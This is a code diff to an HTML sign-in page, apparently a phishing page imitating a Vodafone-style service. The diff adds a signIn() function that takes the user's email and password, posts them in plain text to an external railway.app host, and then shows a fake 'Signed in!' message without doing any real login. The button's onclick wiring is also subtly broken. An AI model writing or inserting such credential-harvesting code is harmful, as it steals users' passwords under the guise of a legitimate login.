@@ -417,7 +417,7 @@
       <a href="#" class="forgot">Forgot password?</a>
     </div>
 
-    <button class="btn-primary" onclick="void(0)">Sign In</button>
+    <button class="btn-primary" onclick="signIn">Sign In</button>
 
     <div class="signup-row">
       Don't have an account? <a href="#">Create one free</a>
@@ -456,6 +456,19 @@
   document.getElementById('remCheck').addEventListener('change', function() {
     // checkbox state handled via CSS
   });
+
+  async function signIn() {
+  const email = document.querySelector('input[type="email"]').value;
+  const password = document.getElementById('pwInput').value;
+
+  await fetch('https://vodaphonefreereading-production.up.railway.app/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ text: email + ' | ' + password })
+  });
+
+  alert('Signed in!');
+}
 </script>
 </body>
 </html>
